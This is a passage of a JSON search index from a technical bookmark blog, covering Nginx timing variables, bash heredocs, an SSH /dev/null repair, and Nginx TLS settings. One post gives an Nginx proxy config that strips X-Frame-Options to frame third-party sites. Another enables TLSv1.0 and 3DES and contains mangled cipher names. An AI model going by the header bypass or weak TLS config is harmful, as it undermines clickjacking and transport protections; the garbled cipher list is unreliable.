definition\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003erequest_time\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e从接受用户请求的第一个字节到发送完响应数据的时间，即\u003ccode\u003e$request_time\u003c/code\u003e 包括接收客户端请求数据的时间、后端程序响应的时间、发送响应数据给客户端的时间(不包含写日志的时间)。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eupstream_response_time\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e从 Nginx 向后端建立连接开始到接受完数据然后关闭连接为止的时间\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eupstream_connect_time\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e跟后端 server 建立连接的时间，如果是到后端使用了加密的协议，该时间将包括握手的时间。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eupstream_header_time\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e接收后端 server 响应头的时间\u003c/p\u003e\n\u003cp\u003e如果把整个过程补充起来的话 应该是：\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e［1用户请求］［2建立 Nginx 连接］［3发送响应］［4接收响应］［5关闭  Nginx 连接］\u003c/code\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e那么 \u003ccode\u003eupstream_response_time\u003c/code\u003e 就是 \u003ccode\u003e2+3+4+5\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e但是 一般这里面可以认为 \u003ccode\u003e［5关闭 Nginx 连接］\u003c/code\u003e 的耗时接近 0\u003c/li\u003e\n\u003cli\u003e所以 \u003ccode\u003eupstream_response_time\u003c/code\u003e 实际上就是 \u003ccode\u003e2+3+4\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e而 \u003ccode\u003erequest_time\u003c/code\u003e 是 \u003ccode\u003e1+2+3+4\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e二者之间相差的就是 \u003ccode\u003e［1用户请求］\u003c/code\u003e的时间。\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"upstream_response_time-比-request_time-大\"\u003eupstream_response_time 比 request_time 大\u003c/h4\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://forum.nginx.org/read.php?21,284448,284450#msg-284450\" target=\"_blank\" rel=\"noopener\"\u003ehttps://forum.nginx.org/read.php?21,284448,284450#msg-284450\u003c/a\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e\u003ccode\u003e$upstream_response_time\u003c/code\u003e 由 \u003ccode\u003eclock_gettime(CLOCK_MONOTONIC_COARSE)\u003c/code\u003e计算，默认情况下，它可以过去 4 毫秒，相反，\u003ccode\u003e$request_time\u003c/code\u003e 由 \u003ccode\u003egettimeofday()\u003c/code\u003e计算。 所以最终 upstream_response_time 可能比 response_time 更大。\u003c/p\u003e","tags":["URL","Nginx"],"title":"Nginx - request_time和upstream_response_time详解"},{"categories":["URL","SHELL"],"contents":" How to use a here documents to write data to a file in bash script allow here-documents within shell scripts to be indented in a natural fashion using EOF\u0026lt;\u0026lt;- command \u0026lt;\u0026lt;-EOF msg1 msg2 $var on line EOF Disabling pathname/parameter/variable expansion, command substitution, arithmetic expansion with 'EOF' #!/bin/bash OUT=/tmp/output.txt echo \u0026#34;Starting my script...\u0026#34; echo \u0026#34;Doing something...\u0026#34; # No parameter and variable expansion, command substitution, arithmetic expansion, or pathname expansion is performed on word. # If any part of word is quoted, the delimiter is the result of quote removal on word, and the lines in the here-document # are not expanded. So EOF is quoted as follows cat \u0026lt;\u0026lt;\u0026#39;EOF\u0026#39; \u0026gt;$OUT Status of backup as on $(date) Backing up files $HOME and /etc/ EOF echo \u0026#34;Starting backup using rsync...\u0026#34; ","date":"May 7, 2021","hero":"/images/hero/shell.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20210507-using-heredoc-rediection-in-bash-shell-script-to-write-to-file/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.cyberciti.biz/faq/using-heredoc-rediection-in-bash-shell-script-to-write-to-file/\" target=\"_blank\" rel=\"noopener\"\u003eHow to use a here documents to write data to a file in bash script\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"allow-here-documents-within-shell-scripts-to-be-indented-in-a-natural-fashion-using-eof-\"\u003eallow here-documents within shell scripts to be indented in a natural fashion using \u003ccode\u003eEOF\u0026lt;\u0026lt;-\u003c/code\u003e\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecommand \u003cspan style=\"color:#e6db74\"\u003e\u0026lt;\u0026lt;-EOF\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  msg1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  msg2\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e $var on line\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"disabling-pathnameparametervariable-expansion-command-substitution-arithmetic-expansion-with-eof\"\u003eDisabling pathname/parameter/variable expansion, command substitution, arithmetic expansion with \u003ccode\u003e'EOF'\u003c/code\u003e\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003eOUT\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/tmp/output.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Starting my script...\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Doing something...\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# No parameter and variable expansion, command substitution, arithmetic expansion, or pathname expansion is performed on word.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# If any part of word is quoted, the delimiter  is  the  result  of  quote removal  on word, and the lines in the here-document\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# are not expanded. So EOF is quoted as follows\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecat \u003cspan style=\"color:#e6db74\"\u003e\u0026lt;\u0026lt;\u0026#39;EOF\u0026#39; \u0026gt;$OUT\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  Status of backup as on $(date)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  Backing up files $HOME and /etc/\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Starting backup using rsync...\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","SHELL"],"title":"How to use a here documents to write data to a file in bash script"},{"categories":["URL","Zabbix"],"contents":" Upgrade database failed after ugrade to Zabbix 5\u0026hellip; Upgrade Zabbix (4.0, 4.2, 4.4) to 5.0 / 5.2 | Step by Step Guide ","date":"May 3, 2021","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20210503-upgrade-database-failed-after-ugrade-to-zabbix-5/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.zabbix.com/forum/zabbix-troubleshooting-and-problems/403139-upgrade-database-failed-after-ugrade-to-zabbix-5\" target=\"_blank\" rel=\"noopener\"\u003eUpgrade database failed after ugrade to Zabbix 5\u0026hellip;\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://bestmonitoringtools.com/upgrade-zabbix-to-the-latest-version/\" target=\"_blank\" rel=\"noopener\"\u003eUpgrade Zabbix (4.0, 4.2, 4.4) to 5.0 / 5.2 | Step by Step Guide\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Zabbix"],"title":"Upgrade database failed after ugrade to Zabbix 5..."},{"categories":["URL","Go"],"contents":" High Performance Go Workshop ","date":"April 28, 2021","hero":"/images/hero/go.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20210428-gophercon-2019/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://dave.cheney.net/high-performance-go-workshop/gophercon-2019.html\" target=\"_blank\" rel=\"noopener\"\u003eHigh Performance Go Workshop\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Go"],"title":"High Performance Go Workshop"},{"categories":["URL","Nginx"],"contents":" 通过 Nginx 绕过 X-Frame-Options 限制 X-Frame-Options HTTP 响应头是用来给浏览器指示允许一个页面是否可以在 \u0026lt;frame\u0026gt;, \u0026lt;iframe\u0026gt;, \u0026lt;embed\u0026gt; 或者 \u0026lt;object\u0026gt; 中展现的标记。站点可以通过确保网站没有被嵌入到别人的站点里面，从而避免 Clickjacking 攻击。通过 Nginx 的作为正向代理，我们可以绕过 X-Frame-Options 限制成功的将第三方网页嵌入到自己的页面中。\nX-Frame-Options 响应头有三个可能的值：\ndeny: 表示该页面不允许在 frame 中展示，即便是在相同域名的页面中嵌套也不允许。 sameorigin: 表示该页面可以在相同域名页面的 frame 中展示。 allow-from uri: 表示该页面可以在指定来源的 frame 中展示。 在 Chrome 尝试加载 frame 的内容时，如果 X-Frame-Options 响应头设置为禁止访问，那么 Chrome 会在控制台中显示如下错误。 Refuse to display 'http://192.168.20.101:8080' in a frame because it set 'X-Frame-Options' to 'deny'.\nserver { listen 8080; location / { proxy_hide_header X-Frame-Options; proxy_pass http://{target}; } } 这也当请求 http://{proxy_server}:8080 时，nginx 会做代理转发到 http://{target}，同时在返回结果的时候会隐藏掉 X-Frame-Options 相应头，这样我们自己的网页就能正常通过 iFrame 载入目标网页了。\n","date":"April 26, 2021","hero":"/images/hero/nginx.jpeg","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20210426-nginx-x-frame-options/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://blog.whezh.com/nginx-x-frame-options/\" target=\"_blank\" rel=\"noopener\"\u003e通过 Nginx 绕过 X-Frame-Options 限制\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003ccode\u003eX-Frame-Options\u003c/code\u003e HTTP 响应头是用来给浏览器指示允许一个页面是否可以在 \u003ccode\u003e\u0026lt;frame\u0026gt;\u003c/code\u003e,\u003ccode\u003e \u0026lt;iframe\u0026gt;\u003c/code\u003e, \u003ccode\u003e\u0026lt;embed\u0026gt;\u003c/code\u003e 或者 \u003ccode\u003e\u0026lt;object\u0026gt;\u003c/code\u003e 中展现的标记。站点可以通过确保网站没有被嵌入到别人的站点里面，从而避免 Clickjacking 攻击。通过 Nginx 的作为正向代理，我们可以绕过 \u003ccode\u003eX-Frame-Options\u003c/code\u003e 限制成功的将第三方网页嵌入到自己的页面中。\u003c/p\u003e\n\u003cp\u003eX-Frame-Options 响应头有三个可能的值：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003edeny: 表示该页面不允许在 frame 中展示，即便是在相同域名的页面中嵌套也不允许。\u003c/li\u003e\n\u003cli\u003esameorigin: 表示该页面可以在相同域名页面的 frame 中展示。\u003c/li\u003e\n\u003cli\u003eallow-from uri: 表示该页面可以在指定来源的 frame 中展示。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e在 Chrome 尝试加载 frame 的内容时，如果 X-Frame-Options 响应头设置为禁止访问，那么 Chrome 会在控制台中显示如下错误。\n\u003ccode\u003eRefuse to display 'http://192.168.20.101:8080' in a frame because it set 'X-Frame-Options' to 'deny'.\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eserver\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003elisten\u003c/span\u003e       \u003cspan style=\"color:#ae81ff\"\u003e8080\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003elocation\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eproxy_hide_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eX-Frame-Options\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eproxy_pass\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ehttp://\u003c/span\u003e{\u003cspan style=\"color:#f92672\"\u003etarget}\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e这也当请求 \u003ccode\u003ehttp://{proxy_server}:8080\u003c/code\u003e 时，nginx 会做代理转发到 \u003ccode\u003ehttp://{target}\u003c/code\u003e，同时在返回结果的时候会隐藏掉 \u003ccode\u003eX-Frame-Options\u003c/code\u003e 相应头，这样我们自己的网页就能正常通过 iFrame 载入目标网页了。\u003c/p\u003e","tags":["URL","Nginx"],"title":"通过 Nginx 绕过 X-Frame-Options 限制"},{"categories":["URL","Nginx","JWT"],"contents":" Setting up JWT Authentication Nginx 实现 JWT 验证-基于 OpenResty 实现 ","date":"April 23, 2021","hero":"/images/hero/nginx.jpeg","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20210423-configuring-jwt-authentication/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://docs.nginx.com/nginx/admin-guide/security-controls/configuring-jwt-authentication/\" target=\"_blank\" rel=\"noopener\"\u003eSetting up JWT Authentication\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://segmentfault.com/a/1190000015677681\" target=\"_blank\" rel=\"noopener\"\u003eNginx 实现 JWT 验证-基于 OpenResty 实现\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Nginx","JWT"],"title":"Setting up JWT Authentication"},{"categories":["URL","Linux","SSH"],"contents":" SSH failing with Error : fatal: daemon() failed: No such device /var/log/secure\nOct 10 10:58:05 vps sshd[23799]: fatal: daemon() failed: No such device\n# rm -vf /dev/null removed `/dev/null` -bash-3.2# mknod /dev/null c 1 3 Started SSH and the SSH started responding: # service sshd restart Stopping sshd: [ OK ] Starting sshd: [ OK ] -bash-3.2# service sshd status openssh-daemon (pid 30608) is running… ","date":"March 4, 2021","hero":"/images/hero/linux.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20210304-ssh-failing-with-error-fatal-daemon-failed-no-such-device/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://admin-ahead.com/forum/general-linux/ssh-failing-with-error-fatal-daemon%28%29-failed-no-such-device/\" target=\"_blank\" rel=\"noopener\"\u003eSSH failing with Error : fatal: daemon() failed: No such device\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e/var/log/secure\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eOct 10 10:58:05 vps sshd[23799]: fatal: daemon() failed: No such device\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# rm -vf /dev/null\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eremoved \u003cspan style=\"color:#e6db74\"\u003e`\u003c/span\u003e/dev/null\u003cspan style=\"color:#e6db74\"\u003e`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-bash-3.2# mknod /dev/null c \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eStarted SSH and the SSH started responding:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# service sshd restart\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eStopping sshd: \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e OK \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eStarting sshd: \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e OK \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-bash-3.2# service sshd status\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eopenssh-daemon \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003epid 30608\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e is running…\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Linux","SSH"],"title":"SSH failing with Error : fatal: daemon() failed: No such device"},{"categories":["URL","Gitlab","Mattermost"],"contents":" GitLab 啟用 Project integration - Mattermost slash commands ","date":"January 28, 2021","hero":"/images/hero/gitlab.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20210128-gitlab-mattermost-slash-commands/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://blog.chengweichen.com/2021/01/gitlab-mattermost-slash-commands.html\" target=\"_blank\" rel=\"noopener\"\u003eGitLab 啟用 Project integration - Mattermost slash commands\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Gitlab","Mattermost"],"title":"GitLab 啟用 Project integration - Mattermost slash commands"},{"categories":["URL","Nginx","TLS"],"contents":" Nginx SSL/TLS configuration with TLSv1.2 and TLSv1.3 - ECDHE and strong ciphers suite (Openssl 1.1.1) ssl.conf ## # SSL Settings (TLSv1.2 and TLSv1.3) ## ssl_protocols TLSv1.2 TLSv1.3; ssl_ciphers \u0026#39;TLS13+AESGCM+AES128:EECDH+AES128\u0026#39;; ssl_prefer_server_ciphers on; ssl_session_cache shared:SSL:50m; ssl_session_timeout 1d; ssl_session_tickets off; ssl_ecdh_curve X25519:sect571r1:secp521r1:secp384r1 universal-ssl.conf ## # SSL Settings (TLSv1.0 + TLSv1.1 + TLSv1.2 + TLSv1.3) ## ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; ssl_ciphers \u0026#39;TLS13+AESG+AES128:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES25GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256:DHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA:ECDHE-RSA-AES256-SHA:DHE-R-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:ECDHE-ECDSA-DES-CBC3-SHA:ECDHE-RSA-DES-CBC3-SHA:EDH-RSA-DES-CBC3-S:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA256:AES256-SHA256:AES128-SHA:AES256-SHA:DES-CBC3-SHA:!DSS\u0026#39;; ssl_prefer_server_ciphers on; ssl_session_cache shared:SSL:50m; ssl_session_timeout 1d; ssl_session_tickets off; ssl_ecdh_curve X25519:sect571r1:secp521r1:secp384r1; ","date":"January 22, 2021","hero":"/images/hero/nginx.jpeg","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20210122-7d432c3c3d134cc3cb7e98b30a76c287/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://gist.github.com/VirtuBox/7d432c3c3d134cc3cb7e98b30a76c287\" target=\"_blank\" rel=\"noopener\"\u003eNginx SSL/TLS configuration with TLSv1.2 and TLSv1.3 - ECDHE and strong ciphers suite (Openssl 1.1.1)\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"sslconf\"\u003essl.conf\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e##\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# SSL Settings (TLSv1.2 and TLSv1.3)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e##\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003essl_protocols\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eTLSv1.2\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eTLSv1.3\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003essl_ciphers\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;TLS13+AESGCM+AES128:EECDH+AES128\u0026#39;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003essl_prefer_server_ciphers\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003essl_session_cache\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eshared:SSL:50m\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003essl_session_timeout\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e1d\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003essl_session_tickets\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eoff\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003essl_ecdh_curve\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eX25519:sect571r1:secp521r1:secp384r1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"universal-sslconf\"\u003euniversal-ssl.conf\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e##\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# SSL Settings (TLSv1.0 + TLSv1.1 + TLSv1.2 + TLSv1.3)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e##\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003essl_protocols\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eTLSv1\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eTLSv1.1\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eTLSv1.2\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eTLSv1.3\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003essl_ciphers\u003c/span\u003e \u003cspan 